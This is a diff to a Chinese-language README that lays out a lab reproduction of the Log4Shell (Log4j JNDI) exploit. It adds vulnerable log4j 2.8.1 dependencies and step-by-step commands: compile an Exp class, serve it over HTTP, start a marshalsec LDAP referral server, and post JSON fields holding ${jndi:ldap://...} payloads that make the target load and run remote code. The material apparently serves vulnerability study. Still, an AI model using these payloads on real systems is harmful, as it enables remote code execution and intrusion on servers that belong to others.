@@ -14,9 +14,23 @@
 
 请注意，随着时间的推移，漏洞情况可能会发生变化，所以始终建议查阅官方安全公告和可靠的安全资源以获取最新信息和指导。
 
-大致步骤
-1. 将.java文件进行编译  
-2. python起一个服务
+环境`pom.xml`添加依赖
+```
+<dependency>
+            <groupId>org.apache.logging.log4j</groupId>
+            <artifactId>log4j-core</artifactId>
+            <version>2.8.1</version>
+        </dependency>
+        <dependency>
+            <groupId>org.apache.logging.log4j</groupId>
+            <artifactId>log4j-api</artifactId>
+            <version>2.8.1</version>
+        </dependency>
+```
+
+大致步骤  
+1. 将Exp.java文件进行编译为Exp.class  
+2. 在Exp.class同级目录python起一个服务,
 ```
 python3 -m http.server 1234 
 ```
@@ -24,4 +38,11 @@ python3 -m http.server 1234
 ```
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:1234/#Exp
 ```
-4. post 参数添加 ${jndi:ldap://127.0.0.1:1389/Exp}
+4.用postman测试， post请求 参数添加 ${jndi:ldap://127.0.0.1:1389/Exp}  
+例如：  
+```
+{
+    "user": "${jndi:ldap://192.168.1.105:1389/Exp}",
+    "password": "${jndi:ldap://192.168.1.105:1389/Exp}"
+}
+```
